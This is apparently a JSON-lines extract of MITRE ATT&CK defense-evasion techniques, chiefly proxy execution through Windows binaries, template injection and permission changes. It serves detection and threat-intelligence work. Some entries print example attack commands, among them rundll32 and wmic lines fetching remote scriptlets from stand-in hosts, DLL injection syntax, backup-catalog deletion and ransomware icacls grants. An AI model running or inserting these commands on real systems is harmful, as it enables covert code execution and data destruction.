{"technique_id":"T1218.008","technique_name":"System Binary Proxy Execution: Odbcconf","description":"Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names. The Odbcconf.exe binary may be digitally signed by Microsoft. Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to Regsvr32, odbcconf.exe has a REGSVR flag that can be misused to execute DLLs (ex: odbcconf.exe /S /A &lbrace;REGSVR \"C:\\Users\\Public\\file.dll\"&rbrace;).","detection":"Use process monitoring to monitor the execution and arguments of odbcconf.exe. Compare recent invocations of odbcconf.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of odbcconf.exe may also be useful in determining the origin and purpose of the DLL being loaded.","procedures":["[G0080] Cobalt Group: Cobalt Group has used odbcconf to proxy the execution of malicious DLL files.","[S1039] Bumblebee: Bumblebee can use `odbcconf.exe` to run DLLs on targeted hosts.","[S1130] Raspberry Robin: Raspberry Robin uses the Windows utility odbcconf.exe to execute malicious commands, using the regsvr flag to execute DLLs and bypass application control mechanisms that are not monitoring for odbcconf.exe abuse."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1218.009","technique_name":"System Binary Proxy Execution: Regsvcs/Regasm","description":"Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are binaries that may be digitally signed by Microsoft. Both utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: [ComRegisterFunction] or [ComUnregisterFunction] respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute.","detection":"Use process monitoring to monitor the execution and arguments of Regsvcs.exe and Regasm.exe. Compare recent invocations of Regsvcs.exe and Regasm.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after Regsvcs.exe or Regasm.exe invocation may also be useful in determining the origin and purpose of the binary being executed.","procedures":["[S0331] Agent Tesla: Agent Tesla has dropped RegAsm.exe onto systems for performing malicious activity."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1218.010","technique_name":"System Binary Proxy Execution: Regsvr32","description":"Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments. Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via Component Object Model Hijacking.","detection":"Use process monitoring to monitor the execution and arguments of regsvr32.exe. Compare recent invocations of regsvr32.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the regsvr32.exe invocation may also be useful in determining the origin and purpose of the script or DLL being loaded.","procedures":["[S1018] Saint Bot: Saint Bot has used `regsvr32` to execute scripts.","[S0650] QakBot: QakBot can use Regsvr32 to execute malicious DLLs.","[G0127] TA551: TA551 has used regsvr32.exe to load malicious DLLs.","[S0367] Emotet: Emotet uses RegSvr32 to execute the DLL payload.","[S0229] Orz: Some Orz versions have an embedded DLL known as MockDll that uses Process Hollowing and regsvr32 to execute another payload.","[S0250] Koadic: Koadic can use Regsvr32 to execute additional payloads.","[S0476] Valak: Valak has used regsvr32.exe to launch malicious DLLs.","[S1030] Squirrelwaffle: Squirrelwaffle has been executed using `regsvr32.exe`.","[S1047] Mori: Mori can use `regsvr32.exe` for DLL execution.","[S1155] Covenant: Covenant can create SCT files for installation via `Regsvr32` to deploy new Grunt listeners.","[S0373] Astaroth: Astaroth can be loaded through regsvr32.exe.","[S0384] Dridex: Dridex can use `regsvr32.exe` to initiate malicious code.","[S1130] Raspberry Robin: Raspberry Robin uses regsvr32.exe execution without any command line parameters for command and control requests to IP addresses associated with Tor nodes.","[S0021] Derusbi: Derusbi variants have been seen that use Registry persistence to proxy execution through regsvr32.exe.","[G0009] Deep Panda: Deep Panda has used regsvr32.exe to execute a server variant of Derusbi in victim networks.","[S0270] RogueRobin: RogueRobin uses regsvr32.exe to run a .sct file for execution.","[G0080] Cobalt Group: Cobalt Group has used regsvr32.exe to execute scripts.","[C0022] Operation Dream Job: During Operation Dream Job, Lazarus Group used `regsvr32` to execute malware.","[S0481] Ragnar Locker: Ragnar Locker has used regsvr32.exe to execute components of VirtualBox.","[G0108] Blue Mockingbird: Blue Mockingbird has executed custom-compiled XMRIG miner DLLs using regsvr32.exe.","[S0698] HermeticWizard: HermeticWizard has used `regsvr32.exe /s /i` to execute malicious payloads.","[S0554] Egregor: Egregor has used regsvr32.exe to execute malicious DLLs.","[C0015] C0015: During C0015, the threat actors employed code that used `regsvr32` for execution.","[G0065] Leviathan: Leviathan has used regsvr32 for execution.","[G0094] Kimsuky: Kimsuky has executed malware with regsvr32s.","[G0100] Inception: Inception has ensured persistence at system boot by setting the value regsvr32 %path%\\ctfmonrn.dll /s.","[G0090] WIRTE: WIRTE has used `regsvr32.exe` to trigger the execution of a malicious script.","[S0284] More_eggs: More_eggs has used regsvr32.exe to execute the malicious DLL.","[G0050] APT32: APT32 created a Scheduled Task/Job that used regsvr32.exe to execute a COM scriptlet that dynamically downloaded a backdoor and injected it into memory. The group has also used regsvr32 to run their backdoor.","[S0568] EVILNUM: EVILNUM can run a remote scriptlet that drops a file and executes it via regsvr32.exe.","[S0087] Hi-Zor: Hi-Zor executes using regsvr32.exe called from the Registry Run Keys / Startup Folder persistence mechanism.","[S0622] AppleSeed: AppleSeed can call regsvr32.exe for execution.","[S0341] Xbash: Xbash can use regsvr32 for executing scripts.","[G0073] APT19: APT19 used Regsvr32 to bypass application control techniques."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1218.011","technique_name":"System Binary Proxy Execution: Rundll32","description":"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: rundll32.exe {DLLname, DLLfunction}). Rundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute. For example, ClickOnce can be proxied through Rundll32.exe. Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\" This behavior has been seen used by malware such as Poweliks. Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command rundll32.exe ExampleDLL.dll, ExampleFunction, rundll32.exe would first attempt to execute ExampleFunctionW, or failing that ExampleFunctionA, before loading ExampleFunction). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending W and/or A to harmless ones. DLL functions can also be exported and executed by an ordinal number (ex: rundll32.exe file.dll,#1). Additionally, adversaries may use Masquerading techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.","detection":"Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded. Analyzing DLL exports and comparing to runtime arguments may be useful in uncovering obfuscated function calls.","procedures":["[C0022] Operation Dream Job: During Operation Dream Job, Lazarus Group executed malware with `C:\\\\windows\\system32\\rundll32.exe \"C:\\ProgramData\\ThumbNail\\thumbnail.db\"`, `CtrlPanel S-6-81-3811-75432205-060098-6872 0 0 905`.","[S0260] InvisiMole: InvisiMole has used rundll32.exe for execution.","[C0021] C0021: During C0021, the threat actors used `rundll32.exe` to execute the Cobalt Strike Beacon loader DLL.","[S1160] Latrodectus: Latrodectus can use rundll32.exe to execute downloaded DLLs.","[S0196] PUNCHBUGGY: PUNCHBUGGY can load a DLL using Rundll32.","[S0635] BoomBox: BoomBox can use RunDLL32 for execution.","[S0045] ADVSTORESHELL: ADVSTORESHELL has used rundll32.exe in a Registry value to establish persistence.","[S0204] Briba: Briba uses rundll32 within Registry Run Keys / Startup Folder entries to execute malicious DLLs.","[S0576] MegaCortex: MegaCortex has used rundll32.exe to load a DLL for file encryption.","[S1064] SVCReady: SVCReady has used `rundll32.exe` for execution.","[S0342] GreyEnergy: GreyEnergy uses PsExec locally in order to execute rundll32.exe at the highest privileges (NTAUTHORITY\\SYSTEM).","[S0142] StreamEx: StreamEx uses rundll32 to call an exported function.","[S0082] Emissary: Variants of Emissary have used rundll32.exe in Registry values added to establish persistence.","[S0139] PowerDuke: PowerDuke uses rundll32.exe to load.","[S1190] Kapeka: Kapeka is a Windows DLL file executed via ordinal by `rundll32.exe`.","[S0256] Mosquito: Mosquito's launcher uses rundll32.exe in a Registry Key value to start the main backdoor capability.","[S0113] Prikormka: Prikormka uses rundll32.exe to load its DLL.","[S0554] Egregor: Egregor has used rundll32 during execution.","[G0047] Gamaredon Group: Gamaredon Group malware has used rundll32 to launch additional malicious components.","[S0518] PolyglotDuke: PolyglotDuke can be executed using rundll32.exe.","[S0081] Elise: After copying itself to a DLL file, a variant of Elise calls the DLL file using rundll32.exe.","[G0046] FIN7: FIN7 has used `rundll32.exe` to execute malware on a compromised network.","[G0073] APT19: APT19 configured its payload to inject into the rundll32.exe.","[S0438] Attor: Attor's installer plugin can schedule rundll32.exe to load the dispatcher.","[S1044] FunnyDream: FunnyDream can use `rundll32` for execution of its components.","[G0094] Kimsuky: Kimsuky has used `rundll32.exe` to execute malicious scripts and malware on a victim's network.","[S0634] EnvyScout: EnvyScout has the ability to proxy execution of malicious files with Rundll32.","[S0483] IcedID: IcedID has used rundll32.exe to execute the IcedID loader.","[S1183] StrelaStealer: StrelaStealer DLL payloads have been executed via `rundll32.exe`.","[S0093] Backdoor.Oldrea: Backdoor.Oldrea can use rundll32 for execution on compromised hosts.","[C0015] C0015: During C0015, the threat actors loaded DLLs via `rundll32` using the `svchost` process.","[G0008] Carbanak: Carbanak installs VNC server software that executes through rundll32.","[G0022] APT3: APT3 has a tool that can run DLLs.","[G0059] Magic Hound: Magic Hound has used rundll32.exe to execute MiniDump from comsvcs.dll when dumping LSASS memory.","[G0127] TA551: TA551 has used rundll32.exe to load malicious DLLs.","[S1122] Mispadu: Mispadu uses RunDLL32 for execution via its injector DLL.","[S0255] DDKONG: DDKONG uses Rundll32 to ensure only a single instance of itself is running at once.","[S0032] gh0st RAT: A gh0st RAT variant has used rundll32 for execution.","[S0461] SDBbot: SDBbot has used rundll32.exe to execute DLLs.","[G0108] Blue Mockingbird: Blue Mockingbird has executed custom-compiled XMRIG miner DLLs using rundll32.exe.","[G0102] Wizard Spider: Wizard Spider has utilized `rundll32.exe` to deploy ransomware commands with the use of WebDAV.","[S0141] Winnti for Windows: The Winnti for Windows installer loads a DLL using rundll32.","[S0046] CozyCar: The CozyCar dropper copies the system file rundll32.exe to the install location for the malware, then uses the copy of rundll32.exe to load and execute the main CozyCar component.","[S1052] DEADEYE: DEADEYE can use `rundll32.exe` for execution of living off the land binaries (lolbin) such as `SHELL32.DLL`.","[G0050] APT32: APT32 malware has used rundll32.exe to execute an initial infection process.","[S1027] Heyoka Backdoor: Heyoka Backdoor can use rundll32.exe to gain execution.","[S1026] Mongall: Mongall can use `rundll32.exe` for execution.","[S0559] SUNBURST: SUNBURST used Rundll32 to execute payloads.","[S1039] Bumblebee: Bumblebee has used `rundll32` for execution of the loader component.","[G0032] Lazarus Group: Lazarus Group has used rundll32 to execute malicious payloads on a compromised host.","[G0092] TA505: TA505 has leveraged rundll32.exe to execute malicious DLLs.","[S0606] Bad Rabbit: Bad Rabbit has used rundll32 to launch a malicious DLL as C:Windowsinfpub.dat.","[S1050] PcShare: PcShare has used `rundll32.exe` for execution.","[G0052] CopyKittens: CopyKittens uses rundll32 to load various tools on victims, including a lateral movement tool named Vminst, Cobalt Strike, and shellcode.","[G0096] APT41: APT41 has used rundll32.exe to execute a loader.","[S0381] FlawedAmmyy: FlawedAmmyy has used `rundll32` for execution.","[S1100] Ninja: Ninja loader components can be executed through rundll32.exe.","[C0024] SolarWinds Compromise: During the SolarWinds Compromise, APT29 used `Rundll32.exe` to execute payloads.","[G0034] Sandworm Team: Sandworm Team used a backdoor which could execute a supplied DLL using rundll32.exe.","[G0007] APT28: APT28 executed CHOPSTICK by using rundll32 commands such as rundll32.exe “C:\\Windows\\twain_64.dll”. APT28 also executed a .dll for a first stage dropper using rundll32.exe. An APT28 loader Trojan saved a batch script that uses rundll32 to execute a DLL payload.","[S0268] Bisonal: Bisonal has used rundll32.exe to execute as part of the Registry Run key it adds: HKEY_CURRENT_USER \\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\”vert” = “rundll32.exe c:\\windows\\temp\\pvcu.dll , Qszdez”.","[G0125] HAFNIUM: HAFNIUM has used rundll32 to load malicious DLLs.","[S0452] USBferry: USBferry can execute rundll32.exe in memory to avoid detection.","[S1130] Raspberry Robin: Raspberry Robin uses rundll32 execution without any command line parameters to contact command and control infrastructure, such as IP addresses associated with Tor nodes.","[S0147] Pteranodon: Pteranodon executes functions using rundll32.exe.","[C0028] 2015 Ukraine Electric Power Attack: During the 2015 Ukraine Electric Power Attack, Sandworm Team used a backdoor which could execute a supplied DLL using `rundll32.exe`.","[S0637] NativeZone: NativeZone has used rundll32 to execute a malicious DLL.","[S0074] Sakula: Sakula calls cmd.exe to run various DLL files via rundll32.","[S1196] Troll Stealer: Troll Stealer is dropped as a DLL file and executed via `rundll32.exe` by its installer.","[S0412] ZxShell: ZxShell has used rundll32.exe to execute other DLLs and named pipes.","[S0382] ServHelper: ServHelper contains a module for downloading and executing DLLs that leverages rundll32.exe.","[S0353] NOKKI: NOKKI has used rundll32 for execution.","[S0512] FatDuke: FatDuke can execute via rundll32.","[S0148] RTM: RTM runs its core DLL file using rundll32.exe.","[S0236] Kwampirs: Kwampirs uses rundll32.exe in a Registry value added to establish persistence.","[S0356] KONNI: KONNI has used Rundll32 to execute its loader for privilege escalation purposes.","[S0267] FELIXROOT: FELIXROOT uses Rundll32 for executing the dropper program.","[C0005] Operation Spalax: During Operation Spalax, the threat actors used `rundll32.exe` to execute malicious installers.","[S0589] Sibot: Sibot has executed downloaded DLLs with rundll32.exe.","[S0244] Comnie: Comnie uses Rundll32 to load a malicious DLL.","[S0568] EVILNUM: EVILNUM can execute commands and scripts through rundll32.","[G0082] APT38: APT38 has used rundll32.exe to execute binaries, scripts, and Control Panel Item files and to execute code via proxy to avoid triggering security tools.","[G1034] Daggerfly: Daggerfly proxied execution of malicious DLLs through a renamed rundll32.exe binary.","[S0520] BLINDINGCAN: BLINDINGCAN has used Rundll32 to load a malicious DLL.","[G1039] RedCurl: RedCurl has used rundll32.exe to execute malicious files.","[S0137] CORESHELL: CORESHELL is installed via execution of rundll32 with an export named \"init\" or \"InitW.\"","[S0167] Matryoshka: Matryoshka uses rundll32.exe in a Registry Run key value for execution as part of its persistence mechanism.","[S0143] Flame: Rundll32.exe is used as a way of executing Flame at the command-line.","[G0140] LazyScripter: LazyScripter has used `rundll32.exe` to execute Koadic stagers.","[S0368] NotPetya: NotPetya uses rundll32.exe to install itself on remote systems when accessed via PsExec or wmic.","[S0154] Cobalt Strike: Cobalt Strike can use `rundll32.exe` to load DLL from the command line.","[S0044] JHUHUGIT: JHUHUGIT is executed using rundll32.exe.","[S0698] HermeticWizard: HermeticWizard has the ability to create a new process using `rundll32`.","[G0143] Aquatic Panda: Aquatic Panda used rundll32.exe to proxy execution of a malicious DLL file identified as a keylogging binary.","[S0481] Ragnar Locker: Ragnar Locker has used rundll32.exe to execute components of VirtualBox.","[G0069] MuddyWater: MuddyWater has used malware that leveraged rundll32.exe in a Registry Run key to execute a .dll.","[S0650] QakBot: QakBot has used Rundll32.exe to drop malicious DLLs including Brute Ratel C4 and to enable C2 communication.","[C0037] Water Curupira Pikabot Distribution: Water Curupira Pikabot Distribution utilizes rundll32.exe to execute the final Pikabot payload, using the named exports `Crash` or `Limit` depending on the variant.","[S1030] Squirrelwaffle: Squirrelwaffle has been executed using `rundll32.exe`.","[S0250] Koadic: Koadic can use Rundll32 to execute additional payloads.","[C0018] C0018: During C0018, the threat actors used `rundll32` to run Mimikatz."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1218.012","technique_name":"System Binary Proxy Execution: Verclsid","description":"Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell. Adversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by running verclsid.exe /S /C {CLSID}, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to Regsvr32). Since the binary may be signed and/or native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse.","detection":"Use process monitoring to monitor the execution and arguments of verclsid.exe. Compare recent invocations of verclsid.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of verclsid.exe may also be useful in determining the origin and purpose of the payload being executed. Depending on the environment, it may be unusual for verclsid.exe to have a parent process of a Microsoft Office product. It may also be unusual for verclsid.exe to have any child processes or to make network connections or file modifications.","procedures":["[S0499] Hancitor: Hancitor has used verclsid.exe to download and execute a malicious script."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1218.013","technique_name":"System Binary Proxy Execution: Mavinject","description":"Adversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V). Adversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e. Dynamic-link Library Injection), allowing for arbitrary code execution (ex. C:\\Windows\\system32\\mavinject.exe PID /INJECTRUNNING PATH_DLL). Since mavinject.exe may be digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process. In addition to Dynamic-link Library Injection, Mavinject.exe can also be abused to perform import descriptor injection via its /HMODULE command-line parameter (ex. mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER). This command would inject an import table entry consisting of the specified DLL into the module at the given base address.","detection":"Monitor the execution and arguments of mavinject.exe. Compare recent invocations of mavinject.exe with prior history of known good arguments and injected DLLs to determine anomalous and potentially adversarial activity. Adversaries may rename abusable binaries to evade detections, but the argument INJECTRUNNING is required for mavinject.exe to perform Dynamic-link Library Injection and may therefore be monitored to alert malicious activity.","procedures":null,"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1218.014","technique_name":"System Binary Proxy Execution: MMC","description":"Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt. MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration. For example, mmc C:\\Users\\foo\\admintools.msc /a will open a custom, saved console msc file in author mode. Another common example is mmc gpedit.msc, which will open the Group Policy Editor application window. Adversaries may use MMC commands to perform malicious tasks. For example, mmc wbadmin.msc delete catalog -quiet deletes the backup catalog on the system (i.e. Inhibit System Recovery) without prompts to the user (Note: wbadmin.msc may only be present by default on Windows Server operating systems). Adversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a Component Object Model class object. Then, adversaries may create custom consoles with the “Link to Web Address” snap-in that is linked to the malicious CLSID subkey. Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command: mmc.exe -Embedding C:\\path\\to\\test.msc.","detection":"Monitor processes and command-line parameters for suspicious or malicious use of MMC. Since MMC is a signed Windows binary, verify use of MMC is legitimate and not malicious. Monitor for creation and use of .msc files. MMC may legitimately be used to call Microsoft-created .msc files, such as services.msc or eventvwr.msc. Invoking non-Microsoft .msc files may be an indicator of malicious activity.","procedures":["[C0047] RedDelta Modified PlugX Infection Chain Operations: Mustang Panda used Microsoft Management Console Snap-In Control files, or MSC files, executed via MMC to run follow-on PowerShell commands during RedDelta Modified PlugX Infection Chain Operations."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1218.015","technique_name":"System Binary Proxy Execution: Electron Applications","description":"Adversaries may abuse components of the Electron framework to execute malicious code. The Electron framework hosts many common applications such as Signal, Slack, and Microsoft Teams. Originally developed by GitHub, Electron is a cross-platform desktop application development framework that employs web technologies like JavaScript, HTML, and CSS. The Chromium engine is used to display web content and Node.js runs the backend code. Due to the functional mechanics of Electron (such as allowing apps to run arbitrary commands), adversaries may also be able to perform malicious functions in the background potentially disguised as legitimate tools within the framework. For example, the abuse of `teams.exe` and `chrome.exe` may allow adversaries to execute malicious commands as child processes of the legitimate application (e.g., `chrome.exe --disable-gpu-sandbox --gpu-launcher=\"C:\\Windows\\system32\\cmd.exe /c calc.exe`). Adversaries may also execute malicious content by planting malicious JavaScript within Electron applications.","detection":null,"procedures":["[S1213] Lumma Stealer: Lumma Stealer as leveraged Electron Applications to disable GPU sandboxing to avoid detection by security software."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1220","technique_name":"XSL Script Processing","description":"Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to Trusted Developer Utilities Proxy Execution, the Microsoft common line transformation utility binary (msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension. Command-line examples: * msxsl.exe customers[.]xml script[.]xsl * msxsl.exe script[.]xsl script[.]xsl * msxsl.exe script[.]jpeg script[.]jpeg Another variation of this technique, dubbed “Squiblytwo”, involves using Windows Management Instrumentation to invoke JScript or VBScript within an XSL file. This technique can also execute local/remote scripts and, similar to its Regsvr32/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in Windows Management Instrumentation provided they utilize the /FORMAT switch. Command-line examples: * Local File: wmic process list /FORMAT:evil[.]xsl * Remote File: wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”","detection":"Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line arguments, creation of external network connections, loading of DLLs associated with scripting). Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded. The presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.","procedures":["[S0373] Astaroth: Astaroth executes embedded JScript or VBScript in an XSL stylesheet located on a remote domain.","[G0080] Cobalt Group: Cobalt Group used msxsl.exe to bypass AppLocker and to invoke Jscript code from an XSL file.","[G0126] Higaisa: Higaisa used an XSL file to run VBScript code.","[C0022] Operation Dream Job: During Operation Dream Job, Lazarus Group used a remote XSL script to download a Base64-encoded DLL custom downloader."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1221","technique_name":"Template Injection","description":"Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered. Properties within parts may reference shared public resources accessed via online URLs. For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded. Adversaries may abuse these templates to initially conceal malicious code to be executed via user documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded. These documents can be delivered via other techniques such as Phishing and/or Taint Shared Content and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched. Examples have been seen in the wild where template injection was used to load malicious code containing an exploit. Adversaries may also modify the *\\template control word within an .rtf file to similarly conceal then download malicious code. This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened. However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload. This technique may also enable Forced Authentication by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.","detection":"Analyze process behavior to determine if user document applications (such as Office) are performing actions, such as opening network connections, reading files, spawning abnormal child processes (ex: PowerShell), or other suspicious actions that could relate to post-compromise behavior. Monitor .rtf files for strings indicating the &#42;\\template control word has been modified to retrieve a URL resource, such as &#42;\\template http or &#42;\\template \\u-.","procedures":["[G0035] Dragonfly: Dragonfly has injected SMB URLs into malicious Word spearphishing attachments to initiate Forced Authentication.","[G0142] Confucius: Confucius has used a weaponized Microsoft Word document with an embedded RTF exploit.","[C0022] Operation Dream Job: During Operation Dream Job, Lazarus Group used DOCX files to retrieve a malicious document template/DOTM file.","[G0081] Tropic Trooper: Tropic Trooper delivered malicious documents with the XLSX extension, typically used by OpenXML documents, but the file itself was actually an OLE (XLS) document.","[G0007] APT28: APT28 used weaponized Microsoft Word documents abusing the remote template function to retrieve a malicious macro.","[C0001] Frankenstein: During Frankenstein, the threat actors used trojanized documents that retrieved remote templates from an adversary-controlled website.","[G0047] Gamaredon Group: Gamaredon Group has used DOCX files to download malicious DOT document templates and has used RTF template injection to download malicious payloads. Gamaredon Group can also inject malicious macros or remote templates into documents already present on compromised systems.","[S0631] Chaes: Chaes changed the template target of the settings.xml file embedded in the Word document and populated that field with the downloaded URL of the next payload.","[G0100] Inception: Inception has used decoy documents to load malicious remote payloads via HTTP.","[S0670] WarzoneRAT: WarzoneRAT has been install via template injection through a malicious DLL embedded within a template RTF in a Word document.","[G0079] DarkHydrus: DarkHydrus used an open-source tool, Phishery, to inject malicious remote template URLs into Microsoft Word documents and then sent them to victims to enable Forced Authentication."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1222.001","technique_name":"File and Directory Permissions Modification: Windows File and Directory Permissions Modification","description":"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.). Windows implements file and directory ACLs as Discretionary Access Control Lists (DACLs). Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied. Adversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, PowerShell provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon Initialization Scripts, or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.","detection":"Monitor and investigate attempts to modify DACLs and file/directory ownership. Many of the commands used to modify DACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible. Consider enabling file/directory permission change auditing on folders containing key binary/configuration files. For example, Windows Security Log events (Event ID 4670) are created when DACLs are modified.","procedures":["[S0201] JPIN: JPIN can use the command-line utility cacls.exe to change file permissions.","[S0570] BitPaymer: BitPaymer can use icacls /reset and takeown /F to reset a targeted executable's permissions and then take ownership.","[S0531] Grandoreiro: Grandoreiro can modify the binary ACL to prevent security tools from running.","[G0102] Wizard Spider: Wizard Spider has used the icacls command to modify access control to backup servers, providing them with full control of all the system folders.","[S0693] CaddyWiper: CaddyWiper can modify ACL entries to take ownership of files.","[S0446] Ryuk: Ryuk can launch icacls /grant Everyone:F /T /C /Q to delete every access-based restrictions on files and directories.","[S1068] BlackCat: BlackCat can use Windows commands such as `fsutil behavior set SymLinkEvaluation R2L:1` to redirect file system access to a different location after gaining access into compromised networks.","[S0366] WannaCry: WannaCry uses attrib +h and icacls . /grant Everyone:F /T /C /Q to make some of its files hidden and grant all users full access controls.","[S1180] BlackByte Ransomware: BlackByte Ransomware uses the `mountvol.exe` command to mount volume names and leverages the Microsoft Discretionary Access Control List tool, `icacls.exe`, to grant the group to “Everyone” full access to the root of the drive.","[S0612] WastedLocker: WastedLocker has a command to take ownership of a file and reset the ACL permissions using the takeown.exe /F filepath command.","[G1046] Storm-1811: Storm-1811 has used `cacls.exe` via batch script to modify file and directory permissions in victim environments."],"tactics":"TA0005 - Defense Evasion"}
